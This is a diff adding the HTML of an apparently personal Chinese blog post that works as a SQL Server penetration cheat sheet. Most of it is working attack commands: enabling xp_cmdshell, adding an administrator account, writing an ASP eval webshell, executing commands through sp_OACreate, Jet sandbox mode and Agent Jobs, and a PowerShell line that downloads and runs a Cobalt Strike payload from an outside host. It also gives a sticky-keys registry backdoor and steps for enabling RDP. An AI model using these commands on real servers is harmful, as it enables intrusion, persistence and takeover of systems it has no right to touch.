@@ -1,0 +1,385 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>sqlserver渗透 | Gridea</title>
+<link rel="shortcut icon" href="https://piaogexu.github.io/favicon.ico?v=1606548080714">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://piaogexu.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="sqlserver渗透 | Gridea - Atom Feed" href="https://piaogexu.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="1、SQL server渗透测试方法
+1、SA用户空/弱口令的利用
+1.默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）、（ms-sql-hidden    2433/tcp）
+2.弱口令
+Msf或者S..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://piaogexu.github.io">
+  <img class="avatar" src="https://piaogexu.github.io/images/avatar.png?v=1606548080714" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              sqlserver渗透
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-11-28
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h3 id="1-sql-server渗透测试方法">1、SQL server渗透测试方法</h3>
+<h4 id="1-sa用户空弱口令的利用">1、SA用户空/弱口令的利用</h4>
+<p>1.默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）、（ms-sql-hidden    2433/tcp）</p>
+<p>2.弱口令</p>
+<p>Msf或者Scansql扫描器扫描SA用户空／弱口令，弱口令获得之后运用<code>SQLtools</code>或者<code>sql server</code>分析器等进行连接，然后进行上传、查询和执行相关操作。</p>
+<p>以SA用户通过<code>SQL Server</code>的查询分析器连接数据库服务器，以手工方式执行各种存储过程和相关命令，包括：</p>
+<p>l）使用<code>xp_cmdshell</code>扩展存储过程执行操作系统的命令；</p>
+<p>2）利用<code>xp_regread</code>扩展存储过程去读注册表的键值，当然包括SAM键；</p>
+<p>3）使用“<code>bulk insert</code>”语法去读服务器上的任意文件；</p>
+<p>4）使用<code>sp_OACreate</code>、<code>sp_OAMethod</code>和<code>sp_OAGetProperty</code>系统存储过程去创建ActiveX应用程序等</p>
+<p>（1）<code>Sql server</code>可利用<code>xp_cmdshell</code>进行提权。再通过管理工具连接后：</p>
+<ul>
+<li>查询框输入一下语句来查看数据库信息和系统版本：</li>
+</ul>
+<pre><code>select @@version
+</code></pre>
+<ul>
+<li>验证是否为sa权限：</li>
+</ul>
+<pre><code>select IS_SRVROLEMEMBER('sysadmin')
+</code></pre>
+<p>返回1，说明是sa权限，可执行sql语句。</p>
+<ul>
+<li>判断目标机的MSSQL服务是否存在<code>xp_cmdshell</code>扩展存储过程：</li>
+</ul>
+<pre><code>select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';
+
+
+xtype可以是下列对象类型中的一种： 
+C = CHECK 约束　　D = 默认值或 DEFAULT 约束　　F = FOREIGN KEY 约束　　L = 日志　　FN = 标量函数 
+IF = 内嵌表函数 　　P = 存储过程 　　PK = PRIMARY KEY 约束（类型是 K） 　　RF = 复制筛选存储过程
+ S = 系统表 　　TF = 表函数 　　TR = 触发器 　　U = 用户表 　　UQ = UNIQUE 约束（类型是 K） 
+V = 视图 　　X = 扩展存储过程
+</code></pre>
+<p>只要返回结果不是<code>0</code>就说明存在<code>xp_cmdshell</code>扩展存储过程。</p>
+<pre><code>注：
+
+1、前提
+    1）getshell或者存在sql注入并且能够执行命令。
+    2）sql server是system权限，sql server默认就是system权限
+2、xp_cmdshell
+    有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。
+    1）开启xp_cmdshell
+        exec sp_configure 'show advanced options', 1;reconfigure;
+        exec sp_configure 'xp_cmdshell',1;reconfigure;
+    2)关闭xp_cmdshell
+        exec sp_configure 'show advanced options', 1;reconfigure;
+        exec sp_configure 'xp_cmdshell', 0;reconfigure
+3、提权
+    exec master..xp_cmdshell 'net user test pinohd123. /add'    添加用户test，密码test
+    exec master..xp_cmdshell 'net localgroup administrators test add'    添加test用户到管理员组
+</code></pre>
+<p>然后运用<code>xp_cmdshell</code>执行sql查询：</p>
+<pre><code>Exec master..xp_cmdshell 'whoami';
+</code></pre>
+<p>命令并没有执行成功，得到了如下错误信息：</p>
+<p><code>Error Message:SQL Server</code> 阻止了对组件 <code>xp_cmdshell</code> 的 过程<code>sys.xp_cmdshell</code> 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 <code>sp_configure</code> 启用 <code>xp_cmdshell</code>。有关启用 <code>xp_cmdshell</code> 的详细信息，请参阅 SQL Server 联机丛书中的 &quot;外围应用配置器&quot;。</p>
+<p>我们从报错信息可以得出，<code>xp_cmdshell</code>扩展存储过程没被删除，只是禁止访问。于是我们就可以通过SQL语句启用它（用分号分割多语句）</p>
+<pre><code>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+</code></pre>
+<p>返回信息，启动成功。</p>
+<p>配置选项<code>show advanced options</code> 已从 0 更改为 1。请运行 <code>RECONFIGURE</code>语句进行安装。</p>
+<p>配置选项 <code>xp_cmdshell</code> 已从 0 更改为 1。请运行 <code>RECONFIGURE</code> 语句进行安装。</p>
+<p>再执行相关语句：<code>Exec master..xp_cmdshell 'whoami';</code></p>
+<p>返回当前用户。</p>
+<pre><code>注：
+xp_cmdshell 被删除可采用xplog70.dll恢复
+
+Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'
+</code></pre>
+<p>（2）Sql server 写入webshell</p>
+<p>通过<code>sp_makewebtask</code>和<code>xp_cmdshell</code>写入<code>shell</code>。第一个测试没成功，显示：找不到存储过程 <code>sp_makewebtask</code>。</p>
+<p>xp_cmdshell写入：</p>
+<pre><code>exec master..xp_cmdshell 'echo ^&lt;%eval request(&quot;pass&quot;)%^&gt; &gt;c:\java\update.asp'—
+</code></pre>
+<p>type查看：</p>
+<pre><code>exec master..xp_cmdshell 'type c:\java\update.asp'—
+</code></pre>
+<h3 id="mssql执行命令总结">MSSQL执行命令总结</h3>
+<h4 id="方法一xp_cmdshell">方法一：xp_cmdshell</h4>
+<pre><code>exec master..xp_cmdshell &quot;whoami&quot;默认执行是关闭
+
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+</code></pre>
+<p>将1修改为0则为关闭</p>
+<p>xp_cmdshell 被删除可采用xplog70.dll恢复</p>
+<pre><code>Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'
+</code></pre>
+<h4 id="方法二sp_oacreate">方法二：SP_OACREATE</h4>
+<p><code>xp_cmdshell</code> 删除以后，可以使用<code>SP_OACreate</code>。</p>
+<pre><code>EXEC sp_configure 'show advanced options', 1;   
+
+RECONFIGURE WITH OVERRIDE; 
+
+EXEC sp_configure 'Ole Automation Procedures', 1; 
+
+RECONFIGURE WITH OVERRIDE;   
+
+EXEC sp_configure 'show advanced options', 0;
+</code></pre>
+<p>执行[此方法无回显]</p>
+<pre><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;d:\\temp\\1.txt'
+</code></pre>
+<h4 id="方法三通过沙盒执行命令">方法三:通过沙盒执行命令</h4>
+<p>开启沙盒</p>
+<pre><code>exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
+</code></pre>
+<p>利用jet.oledb执行命令</p>
+<pre><code>select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell(&quot;whoami&quot;)')
+
+select * from openrowset('microsoft.jet.oledb.4.0',';database=ias\ias.mdb','select shell(&quot;CMD命令&quot;)')
+</code></pre>
+<p>但是,当 c:\Windows\System32\ias\dnary.mdb 或 c:\Windows\System32\ias\ias.mdb 被删除时,命令就会无效了.</p>
+<p>所以利用以下语句创建一个数据库：(数据库名SysSetup.xml,后缀.xml是自定义,不影响使用.)</p>
+<pre><code>declare @hr int
+
+declare @object int;declare @property int
+
+exec @hr = sp_OACreate 'ADOX.Catalog',@object OUTPUT
+
+exec @hr = sp_OAMethod @object,'Create',@property output,'Provider=Microsoft.Jet.OLEDB.4.0;Data Source=SysSetup.xml'
+</code></pre>
+<p>然后再利用jet.oledb调用SysSetup.xml执行系统命令：</p>
+<pre><code>select * from openrowset('microsoft.jet.oledb.4.0',';database=SysSetup.xml','select shell(&quot;CMD命令&quot;)')
+</code></pre>
+<h4 id="方法四通过agent-job执行命令">方法四:通过Agent Job执行命令</h4>
+<p>修改开启Ageent Job，执行无回显CobaltStrike生成powershell上线</p>
+<pre><code>USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(''http://192.168.214.129:80/a''))&quot;', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1';
+</code></pre>
+<h4 id="方法五1433映像劫持后门提权">方法五：1433映像劫持后门提权</h4>
+<p>首先:</p>
+<p>1.服务器开启了终端端口(终端端口未必是3389,可以自行查询)</p>
+<p>2.服务器的粘滞键功能无损,只要可以正常弹出即可</p>
+<p>3.服务器未禁止注册表编辑(即写入功能)</p>
+<p>sql命令读取服务器终端端口:</p>
+<pre><code>exec master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-
+Tcp','PortNumber'
+</code></pre>
+<p>1.sql命令查询注册表粘滞键是否被劫持</p>
+<pre><code>exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
+</code></pre>
+<p>2.sql命令劫持注册表粘滞键功能,替换成任务管理器(当然你也可以替换成你想要的其他命令)</p>
+<pre><code>xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe',
+'Debugger','REG_SZ','C:\WINDOWS\system32\taskmgr.exe'
+</code></pre>
+<p>3.sql命令删除注册表粘滞键的劫持功能保护你的服务器不再被他人利用</p>
+<pre><code> xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'
+</code></pre>
+<h3 id="3-sql-server-常用操作远程桌面语句">3、sql server 常用操作远程桌面语句</h3>
+<h4 id="1-是否开启远程桌面">1、是否开启远程桌面</h4>
+<ul>
+<li>1：表示关闭</li>
+<li>0：表示开启</li>
+</ul>
+<p>查询语句：</p>
+<pre><code>EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\Terminal Server',
+'fDenyTSConnections'
+</code></pre>
+<h4 id="2-读取远程桌面的端口">2、读取远程桌面的端口</h4>
+<p>语句：</p>
+<pre><code>EXEC master..xp_regread 'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp',
+'PortNumber'
+</code></pre>
+<h4 id="3-开启远程桌面">3、开启远程桌面</h4>
+<pre><code>EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\TerminalServer',
+'fDenyTSConnections','REG_DWORD',0;
+</code></pre>
+<p>reg 文件开启远程桌面：</p>
+<pre><code>Windows Registry Editor Version 5.00HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer]
+&quot;fDenyTSConnections&quot;=dword:00000000[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp]
+&quot;PortNumber&quot;=dword:00000d3d
+</code></pre>
+<p>//// 保存 micropoor.reg，并执行 regedit /s micropoor.reg</p>
+<p>注：如果第一次开启远程桌面，部分需要配置防火墙规则允许远程端口。</p>
+<pre><code>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP
+dir=in localport=3389 action=allow
+</code></pre>
+<h4 id="4-关闭远程桌面">4、关闭远程桌面</h4>
+<pre><code>EXEC master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE',
+'SYSTEM\CurrentControlSet\Control\TerminalServer',
+'fDenyTSConnections','REG_DWORD',1;
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#1-sql-server%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95">1、SQL server渗透测试方法</a>
+<ul>
+<li><a href="#1-sa%E7%94%A8%E6%88%B7%E7%A9%BA%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%9A%84%E5%88%A9%E7%94%A8">1、SA用户空/弱口令的利用</a></li>
+</ul>
+</li>
+<li><a href="#mssql%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93">MSSQL执行命令总结</a>
+<ul>
+<li><a href="#%E6%96%B9%E6%B3%95%E4%B8%80xp_cmdshell">方法一：xp_cmdshell</a></li>
+<li><a href="#%E6%96%B9%E6%B3%95%E4%BA%8Csp_oacreate">方法二：SP_OACREATE</a></li>
+<li><a href="#%E6%96%B9%E6%B3%95%E4%B8%89%E9%80%9A%E8%BF%87%E6%B2%99%E7%9B%92%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">方法三:通过沙盒执行命令</a></li>
+<li><a href="#%E6%96%B9%E6%B3%95%E5%9B%9B%E9%80%9A%E8%BF%87agent-job%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">方法四:通过Agent Job执行命令</a></li>
+<li><a href="#%E6%96%B9%E6%B3%95%E4%BA%941433%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8%E6%8F%90%E6%9D%83">方法五：1433映像劫持后门提权</a></li>
+</ul>
+</li>
+<li><a href="#3-sql-server-%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%AF%AD%E5%8F%A5">3、sql server 常用操作远程桌面语句</a>
+<ul>
+<li><a href="#1-%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2">1、是否开启远程桌面</a></li>
+<li><a href="#2-%E8%AF%BB%E5%8F%96%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E7%AB%AF%E5%8F%A3">2、读取远程桌面的端口</a></li>
+<li><a href="#3-%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2">3、开启远程桌面</a></li>
+<li><a href="#4-%E5%85%B3%E9%97%AD%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2">4、关闭远程桌面</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://piaogexu.github.io/post/linux-ti-quan/">
+              <h3 class="post-title">
+                linux提权
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://piaogexu.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
